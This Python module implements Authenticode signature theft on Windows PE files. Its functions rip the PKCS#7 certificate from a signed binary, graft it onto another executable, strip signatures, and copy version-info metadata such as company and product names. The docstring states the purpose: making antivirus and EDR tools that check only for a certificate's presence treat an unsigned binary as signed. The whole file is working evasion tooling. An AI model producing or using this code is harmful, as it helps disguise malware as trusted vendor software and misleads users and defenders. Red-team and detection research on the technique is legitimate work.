"""PE Authenticode signature theft — rip, graft, remove, check.

Technique: the Authenticode PKCS#7 blob lives after the PE image in a file
region pointed to by the Security Data Directory (data directory index 4).
Grafting copies those bytes from a legitimately-signed binary onto a target
and updates the directory pointer.  The hash inside the PKCS#7 blob won't
match the target's content, so full Authenticode validation fails — but AV/EDR
products that only check cert-table presence or give weight to known CAs will
treat the binary as signed.

Reference: SpecterOps "Subverting Trust in Windows" + SigThief by @subTee.
"""

from __future__ import annotations

import struct
from pathlib import Path

# Offset from OptionalHeader start to the Security Data Directory entry.
# PE32 (0x10B): standard(28) + windows-specific(68) + 4 preceding dirs(32) = 128
# PE32+(0x20B): standard(24) + windows-specific(88) + 4 preceding dirs(32) = 144
_SEC_ENTRY = {0x10B: 128, 0x20B: 144}


def _sec_dir(data: bytes | bytearray) -> tuple[int, int, int]:
    """Return (entry_offset, cert_file_offset, cert_size) for a PE image.

    entry_offset      — file offset of the 8-byte Security Directory entry
    cert_file_offset  — file offset of the PKCS#7 blob (0 if unsigned)
    cert_size         — byte length of the PKCS#7 blob
    """
    pe_off = struct.unpack_from("<I", data, 0x3C)[0]
    opt_start = pe_off + 4 + 20  # skip PE sig (4) + COFF header (20)
    magic = struct.unpack_from("<H", data, opt_start)[0]
    offset = _SEC_ENTRY.get(magic)
    if offset is None:
        raise ValueError(f"unsupported PE magic: 0x{magic:04X}")
    entry = opt_start + offset
    cert_off, cert_sz = struct.unpack_from("<II", data, entry)
    return entry, cert_off, cert_sz


def check(pe: Path) -> bool:
    """True if the PE has a non-zero cert table pointer (presence, not validity)."""
    _, cert_off, _ = _sec_dir(pe.read_bytes())
    return cert_off != 0


def rip(pe: Path, out: Path | None = None) -> Path:
    """Extract the PKCS#7 cert blob from a signed PE to a .sig file."""
    data = pe.read_bytes()
    _, cert_off, cert_sz = _sec_dir(data)
    if cert_off == 0 or cert_sz == 0:
        raise ValueError(f"{pe.name}: not signed")
    out = out or pe.with_suffix(".sig")
    out.write_bytes(data[cert_off : cert_off + cert_sz])
    return out


def graft(source: Path, target: Path, out: Path | None = None) -> Path:
    """Copy the cert blob from source onto target (SigThief technique).

    Authenticode hash validation will fail on the output — only presence
    checks and CA-reputation heuristics see a 'signed' binary.
    """
    src = source.read_bytes()
    _, src_off, src_sz = _sec_dir(src)
    if src_off == 0 or src_sz == 0:
        raise ValueError(f"{source.name}: not signed — nothing to graft")
    blob = src[src_off : src_off + src_sz]

    tgt = bytearray(target.read_bytes())
    entry, _, _ = _sec_dir(tgt)

    # point cert dir entry at end-of-original-file, append blob
    struct.pack_into("<I", tgt, entry, len(tgt))  # file offset of appended cert
    struct.pack_into("<I", tgt, entry + 4, len(blob))  # cert size

    out = out or target.with_stem(target.stem + "_grafted")
    out.write_bytes(bytes(tgt) + blob)
    return out


def graft_sig(sig_file: Path, target: Path, out: Path | None = None) -> Path:
    """Append a previously ripped .sig blob onto target."""
    blob = sig_file.read_bytes()
    tgt = bytearray(target.read_bytes())
    entry, _, _ = _sec_dir(tgt)
    struct.pack_into("<I", tgt, entry, len(tgt))
    struct.pack_into("<I", tgt, entry + 4, len(blob))
    out = out or target.with_stem(target.stem + "_grafted")
    out.write_bytes(bytes(tgt) + blob)
    return out


def remove(pe: Path, out: Path | None = None) -> Path:
    """Zero the cert table pointer and truncate the signature bytes."""
    data = bytearray(pe.read_bytes())
    entry, cert_off, _ = _sec_dir(data)
    if cert_off == 0:
        raise ValueError(f"{pe.name}: not signed")
    struct.pack_into("<I", data, entry, 0)
    struct.pack_into("<I", data, entry + 4, 0)
    out = out or pe.with_stem(pe.stem + "_nosig")
    out.write_bytes(bytes(data[:cert_off]))
    return out


# ── VS_VERSION_INFO (VersionInfo resource) ────────────────────────────────────

_META_FIELDS = (
    "CompanyName",
    "FileDescription",
    "FileVersion",
    "InternalName",
    "LegalCopyright",
    "OriginalFilename",
    "ProductName",
    "ProductVersion",
)


def _find_versioninfo(data: bytes) -> tuple[int, int] | None:
    """Return (file_offset, wLength) of VS_VERSION_INFO block, or None."""
    marker = "VS_VERSION_INFO\x00".encode("utf-16-le")
    idx = data.find(marker)
    if idx < 6:
        return None
    start = idx - 6  # wLength(2) + wValueLength(2) + wType(2) precede the key
    wlen = struct.unpack_from("<H", data, start)[0]
    if wlen < 40 or start + wlen > len(data):
        return None
    return start, wlen


def _extract_meta_strings(vi_blob: bytes) -> dict[str, str]:
    """Heuristically extract StringFileInfo fields from a VS_VERSION_INFO blob."""
    out: dict[str, str] = {}
    for field in _META_FIELDS:
        key = (field + "\x00").encode("utf-16-le")
        pos = vi_blob.find(key)
        if pos < 0:
            continue
        # value starts after key, DWORD-aligned
        v_start = (pos + len(key) + 3) & ~3
        v_end = v_start
        while v_end + 1 < len(vi_blob) and vi_blob[v_end : v_end + 2] != b"\x00\x00":
            v_end += 2
        try:
            val = vi_blob[v_start:v_end].decode("utf-16-le").strip()
            if val:
                out[field] = val
        except UnicodeDecodeError:
            pass
    return out


def read_meta(pe: Path) -> dict[str, str]:
    """Return VS_VERSION_INFO StringFileInfo fields from a PE, or {} if absent."""
    data = pe.read_bytes()
    vi = _find_versioninfo(data)
    if not vi:
        return {}
    start, length = vi
    return _extract_meta_strings(data[start : start + length])


def rip_meta(pe: Path, out: Path | None = None) -> Path:
    """Save raw VS_VERSION_INFO bytes from a PE to a .meta file."""
    data = pe.read_bytes()
    vi = _find_versioninfo(data)
    if not vi:
        raise ValueError(f"{pe.name}: no VS_VERSION_INFO found")
    start, length = vi
    out = out or pe.with_suffix(".meta")
    out.write_bytes(data[start : start + length])
    return out


def graft_with_meta(
    source: Path,
    target: Path,
    out: Path | None = None,
) -> tuple[Path, bool]:
    """Graft both PKCS#7 signature and VS_VERSION_INFO from source onto target.

    VS_VERSION_INFO is overwritten in-place inside the target's existing block.
    Works only when source wLength <= target wLength; otherwise the meta graft is
    skipped (PKCS#7 graft still proceeds).

    Returns (out_path, meta_grafted).
    """
    src = source.read_bytes()
    tgt = bytearray(target.read_bytes())

    # PKCS#7 graft
    _, src_off, src_sz = _sec_dir(src)
    if src_off == 0 or src_sz == 0:
        raise ValueError(f"{source.name}: not signed")
    blob = src[src_off : src_off + src_sz]
    entry, _, _ = _sec_dir(tgt)
    struct.pack_into("<I", tgt, entry, len(tgt))
    struct.pack_into("<I", tgt, entry + 4, len(blob))

    # VS_VERSION_INFO in-place overwrite
    meta_grafted = False
    src_vi = _find_versioninfo(src)
    tgt_vi = _find_versioninfo(bytes(tgt))
    if src_vi and tgt_vi:
        s_start, s_len = src_vi
        t_start, t_len = tgt_vi
        if s_len <= t_len:
            tgt[t_start : t_start + s_len] = src[s_start : s_start + s_len]
            if s_len < t_len:
                tgt[t_start + s_len : t_start + t_len] = b"\x00" * (t_len - s_len)
            meta_grafted = True

    out = out or target.with_stem(target.stem + "_grafted")
    out.write_bytes(bytes(tgt) + blob)
    return out, meta_grafted
